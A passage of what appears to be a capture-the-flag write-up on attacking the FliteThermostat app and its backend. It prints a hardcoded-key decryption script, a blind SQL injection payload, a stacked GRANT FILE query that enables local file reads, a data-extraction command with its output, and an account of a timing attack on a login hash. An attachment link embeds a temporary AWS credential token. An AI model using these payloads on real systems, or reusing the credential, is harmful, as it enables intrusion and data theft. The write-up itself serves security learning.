class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eencodeToString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis code snippet shows that the application used AES with Cipher Block Chaining and PKCS5 padding. A static encryption key is used, and a random IV generated which is prepended to the encrypted message before the entire thing is base64 encoded.\u003c/p\u003e\n\n\u003cp\u003eDecrypting this with Python gives us:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eimport base64\nfrom Crypto.Cipher import AES\n\nkey = [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]\ndef decrypt(data):\n    def _unpad(s):\n        return s[:-ord(s[len(s)-1:])]\n    data = base64.b64decode(data)\n    iv = data[:16]\n    data = data[16:]\n    cipher = AES.new(bytes(key), AES.MODE_CBC, iv)\n    return _unpad(cipher.decrypt(data)).decode()\n\nprint(decrypt(\u0026quot;aKe2ZHj8oYjIqvbWwXi01599IT979iLWxWp6e7LhCqYZUBGSSLBZz6kkEzuElZViz270iXUjPuGgt/803RyZmSHaMd0KzZPTD/dgQlUgoNA=\u0026quot;))\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eArmed with the ability to encrypt and decrypt payloads I could progress to the next stage!\u003c/p\u003e\n\n\u003ch3 id=\"summary-of-issues\"\u003eSummary of Issues:\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eHardcoded cryptographic key\u003c/li\u003e\n\u003cli\u003eNo TLS and certificate pinning\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"stage-3-flitethermostat-api\"\u003eStage 3 - FliteThermostat API\u003c/h2\u003e\n\n\u003cp\u003eVisiting the \u003ca title=\"http://35.243.186.41/\" href=\"/redirect?url=http%3A%2F%2F35.243.186.41%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://35.243.186.41/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e site directly gives the error message \u0026quot;The method is not allowed for the requested URL\u0026quot; showing that I was dealing with a Python Flask application.\u003c/p\u003e\n\n\u003cp\u003eThe first thing I tried was guessing credentials, so I scripted up my encryption / decryption code with Python Requests and started sending username and password combination to the server. Very quickly I come across a valid combination \u003ccode\u003eadmin:password\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003ePlugging these credentials back into the Android application shows some more, but very limited functionality. I now had the ability to send the \u003ccode\u003esetTemp\u003c/code\u003e command (although it should be noted that this doesn\u0026#39;t seem to actually change anything significantly). In order to attempt to increase the application attack surface I set out bruteforcing alternative commands. After a reasonably extensive round of command guessing I came up with only the following commands:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003egetTemp - Gleaned from initial network traffic analysis\u003c/li\u003e\n\u003cli\u003esetTemp - Observed from logging in the the \u003ccode\u003eadmin:password\u003c/code\u003e credentials\u003c/li\u003e\n\u003cli\u003ediag - Guessed command, always responding with \u0026quot;Missing diagnostic parameters\u0026quot; no matter the parameters I supplied\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eNoting that there did not appear to be a large attack surface I reviewed what I already knew, and set about looking for other weaknesses. It was at this point I observed that the \u003ccode\u003eusername\u003c/code\u003e parameter appeared to be vulnerable to blind SQL injection. The following request payload would happily supply the \u003ccode\u003egetTemp\u003c/code\u003e response as if the actual credentials were supplied, confirming the blind SQL injection vulnerability:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;admi\u0026#39; + (SELECT \u0026#39;n\u0026#39;) +\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing Blind SQLi techniques outlined in one of my old blog posts (\u003ca href=\"/redirect?url=https%3A%2F%2Fajxchapman.github.io%2Fsecurity%2F2017%2F01%2F14%2Fblind-sql-injection.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBlind SQL injection optimization\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) I scripted up a tool (\u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-decrypt_sqli-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edecrypt_sqli.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) to efficiently extract the following information from the database:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUser: root@localhost\u003c/li\u003e\n\u003cli\u003eVersion: 10.1.37_mariadb_0_deb9u1\u003c/li\u003e\n\u003cli\u003eHostname: de8c6c400a9f\u003c/li\u003e\n\u003cli\u003eDatabase: flitebackend\u003c/li\u003e\n\u003cli\u003eTables: Columns\n\n\u003cul\u003e\n\u003cli\u003eDevices: ID, IP\u003c/li\u003e\n\u003cli\u003eUsers: ID, username, password\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIn addition to being able to extract data from the database, I noted that stacked queries were permitted, so I could run my own \u003ccode\u003eINSERT\u003c/code\u003e and \u003ccode\u003eUPDATE\u003c/code\u003e queries on the database. Whilst I did not find this particularly useful, I noticed that this could be abused to re-enable local file access through the \u003ccode\u003eLOAD_FILE\u003c/code\u003e function. \u003ccode\u003eLOAD_FILE\u003c/code\u003e was initially restricted as the database user had the \u003ccode\u003eFile_priv\u003c/code\u003e revoked:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eLoad File:\n\n\u003cul\u003e\n\u003cli\u003esql_mode: NO_AUTO_CREATE_USER_NO_ENGINE_SUBSTITUTION\u003c/li\u003e\n\u003cli\u003elocal_infile: ON\u003c/li\u003e\n\u003cli\u003esecure_file_priv: \u0026#39;\u0026#39;\u003c/li\u003e\n\u003cli\u003eFile_priv: N\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eHowever, as the database user is the root user, and stacked queries were permitted I could re-enable \u003ccode\u003eLOAD_FILE\u003c/code\u003e using the following query:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight sql\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eGRANT\u003c/span\u003e \u003cspan class=\"n\"\u003eFILE\u003c/span\u003e \u003cspan class=\"k\"\u003eON\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"k\"\u003eTO\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;root\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;localhost\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003eFLUSH\u003c/span\u003e \u003cspan class=\"k\"\u003ePRIVILEGES\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWith \u003ccode\u003eLOAD_FILE\u003c/code\u003e re-enabled I was able to extract the source code for the FliteThermostat API application from \u003ccode\u003e/app/main.py\u003c/code\u003e, see attachment {main_1.py}! Although this was quite a fun attack vector, it actually didn\u0026#39;t lead to any further stages of the CTF.\u003c/p\u003e\n\n\u003cp\u003eGoing back to the database, dumping the contents of the \u003ccode\u003eDevices\u003c/code\u003e table shows numerous IP addresses, most from reserved IPv4 ranges. Ignoring the reserved addresses the table included a single publicly routable address which was extracted with the following query using the \u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-decrypt_sqli-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edecrypt_sqli.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e tool:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003epython3 decrypt_sqli.py \u003cspan class=\"nt\"\u003e--characters\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;._1234567890\u0026quot;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;SELECT CONCAT(ID, \u0026#39;_\u0026#39;, IP) from devices WHERE IP not LIKE \u0026#39;2__.%\u0026#39; and IP not LIKE \u0026#39;10.%\u0026#39; and IP not LIKE \u0026#39;192.88.%\u0026#39; ORDER BY ID DESC\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight sql\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"n\"\u003eCONCAT\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eID\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eIP\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efrom\u003c/span\u003e \u003cspan class=\"n\"\u003edevices\u003c/span\u003e \u003cspan class=\"k\"\u003eWHERE\u003c/span\u003e \u003cspan class=\"n\"\u003eIP\u003c/span\u003e \u003cspan class=\"k\"\u003enot\u003c/span\u003e \u003cspan class=\"k\"\u003eLIKE\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;2__.%\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003eIP\u003c/span\u003e \u003cspan class=\"k\"\u003enot\u003c/span\u003e \u003cspan class=\"k\"\u003eLIKE\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;10.%\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003eIP\u003c/span\u003e \u003cspan class=\"k\"\u003enot\u003c/span\u003e \u003cspan class=\"k\"\u003eLIKE\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;192.88.%\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003eORDER\u003c/span\u003e \u003cspan class=\"k\"\u003eBY\u003c/span\u003e \u003cspan class=\"n\"\u003eID\u003c/span\u003e \u003cspan class=\"k\"\u003eDESC\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e---------------------+\u003c/span\u003e\n\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eCONCAT\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eID\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eIP\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e---------------------+\u003c/span\u003e\n\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"mi\"\u003e69\u003c/span\u003e\u003cspan class=\"n\"\u003e_104\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e196\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e98\u003c/span\u003e    \u003cspan class=\"o\"\u003e|\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"c1\"\u003e---------------------+\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe extracted address led me to the next stage of the CTF.\u003c/p\u003e\n\n\u003ch4 id=\"tools\"\u003eTools\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-decrypt_sqli-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edecrypt_sqli.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch4 id=\"attachments\"\u003eAttachments\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"main_1.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/687/5edd6fc76f0a9fe0b5dc63741aca3de15cc79db1/main_1.py?response-content-disposition=attachment%3B%20filename%3D%22main_1.py%22%3B%20filename%2A%3DUTF-8%27%27main_1.py\u0026amp;response-content-type=text%2Fx-python\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=42ecdeafabaed9d0afd99c95e1110ad2e8a5f167f3d445f945d975a059f43382\" data-attachment-type=\"text/x-python\"\u003emain_1.py (F439687)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"summary-of-issues\"\u003eSummary of Issues\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eGuessable Credentials\u003c/li\u003e\n\u003cli\u003eBlind SQL Injection\u003c/li\u003e\n\u003cli\u003eInsecure database configuration leading to Local File Disclosure\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"stage-4-flitethermostat-backend\"\u003eStage 4 - FliteThermostat Backend\u003c/h2\u003e\n\n\u003ch3 id=\"stage-4-1-login\"\u003eStage 4.1 Login\u003c/h3\u003e\n\n\u003cp\u003eVisiting the \u003ca title=\"http://104.196.12.98/\" href=\"/redirect?url=http%3A%2F%2F104.196.12.98%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://104.196.12.98/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e application directly showed a login page. Checking a non existing page presented an error message disclosing that once again I was looking at a Python Flask application.\u003c/p\u003e\n\n\u003cp\u003eAttempting to log into the application showed that the provided user credentials were hashed in the browser via JavaScript before being sent to the server:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e104.196.12.98\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate\u003c/span\u003e\n\u003cspan class=\"na\"\u003eReferer\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp://104.196.12.98/\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e69\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUpgrade-Insecure-Requests\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\nhash=f6e6530a2b9bad0780df53a03a161f771fecb83a66c184b356330b38bef67dd6\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eExtracting the JavaScript hashing code in order to pre-compute hashes for various username / password combinations and submitting those hashes did not lead to any results. Guessing application paths only identified pages that redirected to the login page (\u003ccode\u003e/control\u003c/code\u003e, \u003ccode\u003e/diagnostics\u003c/code\u003e, \u003ccode\u003e/main\u003c/code\u003e, \u003ccode\u003e/update\u003c/code\u003e). Unless the credentials were something obscure, I decided there must be another way to bypass the authentication mechanism.\u003c/p\u003e\n\n\u003cp\u003ePlaying with the \u003ccode\u003ehash\u003c/code\u003e parameter, I observed that requests with a \u003ccode\u003ehash\u003c/code\u003e length of 64 characters took \u0026gt; 500ms to respond, where as a \u003ccode\u003ehash\u003c/code\u003e length of anything else returned nearly immediately. It looked like the application may been vulnerable to a timing side-channel attack. Sending 256 requests with each possible value for the first byte soon confirmed it, a \u003ccode\u003ehash\u003c/code\u003e of length 64 which started with \u003ccode\u003ef9\u003c/code\u003e took \u0026gt; 1000ms to respond where as all other values took ~500ms to respond.\u003c/p\u003e\n\n\u003cp\u003eTiming side-channel attacks are notoriously difficult to exploit, especially so across the internet. In this case I appeared to be luck, the timing difference was easily measurable, approximately 500ms for each successful byte guessed. Even so, there were a number of techniques I used that made getting results more reliable. First, I ran my tests from a server as physically close to the target server as possible. The target was running on Google cloud in one of Google\u0026#39;s us-east data centers, so I chose to spin up a VPS in a us-east data center to work from. Secondly, I used HTTP pipelining (a technique inspired by Albinowax\u0026#39;s recent \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DvCpIAsxESFY\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etalk on Turbo Intruder\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) to help minimise TCP connection, send and response delays which would otherwise seriously skew the results. The HTTP pipelining technique I used, sent multiple requests in a single pipeline, and only measured the execution time after a first response was received. Using these techniques in a script, I was able to start getting reliable results.\u003c/p\u003e\n\n\u003cp\u003eThe last problem to overcome was the amount of time it was going to take to guess all 32 bytes of a valid hash. Each successfully guessed byte was adding 500ms to the response time, meaning that guessing all 256 possible characters for the 14th byte would take 30 minutes, and over an hour for the 30th byte. One final shortcut was to stop guessing a byte after a result was received which was within an expected time frame for the next byte. This early exit strategy would theoretically reduce the amount of time required by half, but could possibly introduce inconsistency.\u003c/p\u003e\n\n\u003cp\u003eAfter getting my script as reliable as possible, and leaving it for an overnight run, I had successfully extracted a valid hash value, \u003ccode\u003ef9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\u003c/code\u003e, and with this could log into the application.\u003c/p\u003e\n\n\u003ch4 id=\"tools\"\u003eTools\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-timing_attack-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etiming_attack.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"stage-4-2-exploitation\"\u003eStage 4.2 Exploitation\u003c/h3\u003e\n\n\u003cp\u003eLogging into the application once again gave limited functionality. The most interesting being the \u003ccode\u003e/update\u003c/code\u003e page which appeared to attempt to update the application from the \u003ccode\u003ehttp://update.flitethermostat:5000/\u003c/code\u003e endpoint, however the update consistently failed with an error \u0026quot;Could not connect\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eAttempting to bruteforce parameters on each of the application pages using the Burpsuite parameter names wordlist (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdanielmiessler%2FSecLists%2Fblob%2Fmaster%2FDiscovery%2FWeb-Content%2Fburp-parameter-names.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eburp-parameter-names.txt\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) easily identified the \u003ccode\u003eport\u003c/code\u003e parameter on the \u003ccode\u003e/update\u003c/code\u003e page.\u003c/p\u003e\n\n\u003cp\u003eChanging the \u003ccode\u003eport\u003c/code\u003e parameter affected the port the update function attempted to use, e.g. a \u003ccode\u003eport\u003c/code\u003e parameter of \u003ccode\u003e888\u003c/code\u003e caused the update check to be performed against the \u003ccode\u003ehttp://update.flitethermostat:888/\u003c/code\u003e endpoint. This showed I could have some control over the update endpoint, however the port parameter was limited to integer values only, any non integer value caused a 500 error to occur.\u003c/p\u003e\n\n\u003cp\u003eHaving found one hidden parameter which could modify the update function, I went looking for one which could let me update the host portion of the update check. Using a larger dictionary of parameters produced no new results, so I concluded if a parameter existed it must be a compound parameter made up of multiple words joined together. I wrote another script to help generate compound wordlists, \u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-wordlist_generator-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewordlist_generator.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. This script could be used to scrape target URLs to generate an application specific wordlist, and join words from multiple wordlists in various ways and forms (joined with underscores, camelCase, present participle form, etc.). This produced a huge wordlist for me to unleash against the application.\u003c/p\u003e\n\n\u003cp\u003eThe next problem was how to submit this vast wordlist to the application in a reasonable amount of time. A single threaded, synchronous, python script was far too slow, and whilst tools do exist (Wfuzz for example), I wanted to stick to my initial goal of using my own tooling. Borrowing some code from \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.artificialworlds.net%2Fblog%2F2017%2F06%2F12%2Fmaking-100-million-requests-with-python-aiohttp%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.artificialworlds.net/blog/2017/06/12/making-100-million-requests-with-python-aiohttp/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and using the Python aiohttp library I wrote a very fast asynchronous request library to use \u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-httplib-py\" target=\"_blank\" rel=\"nofollow noopener 